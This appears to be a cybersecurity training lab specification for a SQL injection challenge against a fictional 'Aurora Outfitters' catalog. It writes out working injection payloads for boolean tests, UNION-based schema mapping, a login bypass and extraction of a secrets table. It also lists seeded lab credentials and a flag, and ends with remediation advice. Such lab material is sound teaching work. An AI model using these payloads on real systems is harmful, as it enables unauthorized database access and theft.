# Challenge 4 - SQL Injection

## Purpose

Aurora Outfitters runs GearTrack, an internal product catalog backed by a MySQL-style database. The catalog module was written with string-concatenated queries and no input validation. The learner must prove the injection, map the schema, bypass the staff sign-in, and extract the restricted vault record.

The catalog is a live HTTP service. The learner can drive it from the browser target, from the in-page Kali terminal (`curl`, `sqlmap` are simulated), or with real tooling against the lab host.

## Scope

| Item | Value |
| --- | --- |
| Company | Aurora Outfitters |
| Target | `http://shop.aurora.internal.lab` |
| Lab network | `10.20.0.0/16` |
| Vulnerable parameters | `category` (`/api/products`), `q` (`/api/search`), sign-in fields (`/api/login`) |
| Primary vulnerability | SQL injection (error-based, boolean-based, UNION-based) |
| Flag | `RIVAN{sqli_union_extraction}` |

## Learning Objectives

- Identify database-backed inputs and hidden routes (`robots.txt`).
- Confirm injectability from error messages and boolean behavior.
- Determine column counts and map schema with UNION queries against `information_schema`.
- Bypass authentication with an injection payload.
- Extract restricted data and explain parameterized-query remediation.

## Required Evidence

1. The catalog search and staff sign-in interfaces are discovered.
2. A parameter is confirmed injectable (error or boolean differential).
3. The backend schema is mapped via `information_schema`.
4. The staff sign-in is bypassed with SQL injection.
5. The restricted vault record is extracted.
6. The exact flag is submitted.

## Student Workflow

### Step 0 - Start or Reset the Lab

Open `/challenges/sql-injection` and select **Reset lab**. Reset restores the database, sessions, evidence, and flag state.

### Step 1 - Reconnaissance

Browse the catalog, use the search box, and fetch `/robots.txt`. The robots file discloses `/staff` and references a legacy secrets table. Any executed query records the discovery evidence.

### Step 2 - Confirm the Injection

Submit a single quote in the category parameter:

```text
/api/products?category='
```

The database error quotes the input back, proving string concatenation. Confirm boolean control:

```text
/api/products?category=' OR '1'='1' -- 
```

The query returns all eight products.

### Step 3 - Map the Schema

The product query selects five columns. Probe until the column count matches, then enumerate:

```text
/api/products?category=' UNION SELECT 1,2,3,4,5 -- 
/api/products?category=' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables -- 
/api/products?category=' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='secrets' -- 
```

Relevant tables: `products (id, name, category, price, stock)`, `users (id, username, password, role)`, `secrets (id, item, value)`.

### Step 4 - Bypass the Staff Sign-In

The sign-in runs:

```sql
SELECT id, username, role FROM users WHERE username = '<u>' AND password = '<p>'
```

Authenticate as the administrator without a password:

```text
username: admin' -- 
password: anything
```

An authenticated administrator can also read `/api/admin/users`.

### Step 5 - Extract the Vault Record

Dump the secrets table:

```text
/api/products?category=' UNION SELECT id,item,value,4,5 FROM secrets -- 
```

The `lab_flag` row contains `RIVAN{sqli_union_extraction}`. Submit the exact value.

## Expected Evidence States

| Evidence | Trigger |
| --- | --- |
| Interfaces discovered | Any catalog query executes |
| Injection confirmed | Input includes `'` and the query errors, or `' OR '1'='1'` returns all rows |
| Schema mapped | A query references `information_schema.tables` or `information_schema.columns` |
| Sign-in bypassed | Login succeeds with an injected username |
| Vault record extracted | The flag value appears in a result set |
| Flag submitted | Server validates the exact flag |

## Reset Requirements

Reset must restore the products, users, and secrets tables to their initial rows, invalidate all catalog sessions, and clear evidence and flag state.

## Instructor Notes

Seeded staff accounts (for realism; none are required to solve): `admin` / `Aur0ra!Adm1n#24` (administrator), `jpark` / `jpark-gear-2023` (buyer), `warehouse.ops` / `Ops!Warehouse1` (staff), `auditor` / `Audit!Read0nly` (auditor). The secrets table also holds a decoy `supplier_api_key`. The simulated terminal recognizes `sqlmap` and produces a plausible dump for learners who prefer tooling.

## Remediation

**Vulnerability:** SQL injection in the catalog and sign-in modules.

**Attack surface:** `category` and `q` query parameters, and the staff sign-in username/password fields.

**Impact:** Full database read access, authentication bypass, and disclosure of restricted vault records.

**Root cause:** Queries are built by string concatenation with attacker-controlled input.

**Remediation:** Use parameterized queries or a prepared-statement ORM everywhere, apply least-privilege database accounts, return generic errors, add a Web Application Firewall rule set as defense in depth, and add regression tests that fuzz every parameter with metacharacters.
